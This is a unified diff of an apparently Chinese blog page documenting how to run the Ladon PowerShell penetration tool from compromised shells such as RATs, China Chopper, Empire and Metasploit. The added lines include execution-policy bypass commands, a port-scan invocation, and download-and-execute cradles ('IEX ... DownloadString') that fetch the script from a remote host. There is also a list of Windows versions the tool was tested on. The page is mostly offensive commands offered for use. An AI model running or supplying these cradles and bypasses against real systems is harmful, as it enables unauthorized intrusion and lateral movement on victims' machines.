@@ -195,7 +195,7 @@
         
         <p class="fa fa-exclamation-triangle warning">
             本文于<strong>
-                1884</strong>
+                1895</strong>
             天之前发表
         </p>
         
@@ -269,15 +269,25 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell </span><br><span class="line">&gt; Import-Module .\Ladon.ps1</span><br><span class="line">&gt; Ladon OnlinePC</span><br></pre></td></tr></table></figure>
 <p><img data-original="https://k8gege.org/k8img/Ladon/PowerLadon.gif"></p>
 <h4 id="0x002-Cmd本地加载"><a href="#0x002-Cmd本地加载" class="headerlink" title="0x002 Cmd本地加载"></a>0x002 Cmd本地加载</h4><p>适用于还没跟上时代的远控或Shell只支持CMD交互</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell Import-Module .\Ladon.ps1;Ladon OnlinePC</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell Import-Module .\Ladon.ps1;Ladon w</span><br><span class="line"></span><br><span class="line">powershell -<span class="built_in">exec</span> bypass Import-Module .\Ladon.ps1;Ladon whoami</span><br><span class="line"></span><br><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -<span class="built_in">exec</span> bypass Import-Module .\Ladon.ps1;Ladon whoami</span><br></pre></td></tr></table></figure>
 <p><img data-original="https://k8gege.org/k8img/Ladon/ps/CmdPSLadon.gif"></p>
+<p>0x004 Bypass 绕过PowerShell限制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon OnlinePC</span><br></pre></td></tr></table></figure>
+
+<p>0x005 自定义端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass Import-Module .\Ladon.ps1;Ladon PortScan <span class="string">'22,80,135,445'</span></span><br></pre></td></tr></table></figure>
+
+
 <h4 id="0x003-Cmd远程加载"><a href="#0x003-Cmd远程加载" class="headerlink" title="0x003 Cmd远程加载"></a>0x003 Cmd远程加载</h4><p>适用于还没跟上时代的远控或Shell只支持CMD交互</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"</span></span><br><span class="line">powershell -nop -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.8/Ladon.ps1'); Ladon w"</span></span><br></pre></td></tr></table></figure>
+
 <p><img data-original="https://k8gege.org/k8img/Ladon/ps/CmdPSRemoteLadon.gif"></p>
 <h4 id="0x004-远控交互式CMD"><a href="#0x004-远控交互式CMD" class="headerlink" title="0x004 远控交互式CMD"></a>0x004 远控交互式CMD</h4><p><img data-original="https://k8gege.org/k8img/Ladon/ps/psladon_rat.PNG"></p>
 <h4 id="0x005-菜刀非交互CMD"><a href="#0x005-菜刀非交互CMD" class="headerlink" title="0x005 菜刀非交互CMD"></a>0x005 菜刀非交互CMD</h4><p><img data-original="https://k8gege.org/k8img/Ladon/ps/psladon_cd.PNG"></p>
 <h4 id="0x006-Empire非交互CMD"><a href="#0x006-Empire非交互CMD" class="headerlink" title="0x006 Empire非交互CMD"></a>0x006 Empire非交互CMD</h4><p>Empire的shell有点问题，分号被截断，可以加个cmd /c<br><img data-original="https://k8gege.org/k8img/Ladon/ps/psladon_empire.PNG"></p>
 <h4 id="0x007-MSF交互式CMD"><a href="#0x007-MSF交互式CMD" class="headerlink" title="0x007 MSF交互式CMD"></a>0x007 MSF交互式CMD</h4><p><img data-original="https://k8gege.org/k8img/Ladon/ps/psladon_msf.PNG"></p>
+<p>.TestON</p>
+<p>Win7 x86  (Microsoft Windows [6.1.7601])<br>Win8 x64  (Microsoft Windows [6.2.9200])<br>Win10 x64 (Microsoft Windows [10.0.14393])<br>Win11 x64 (Microsoft Windows [10.0.22000.856]</p>
 
     </div>
     
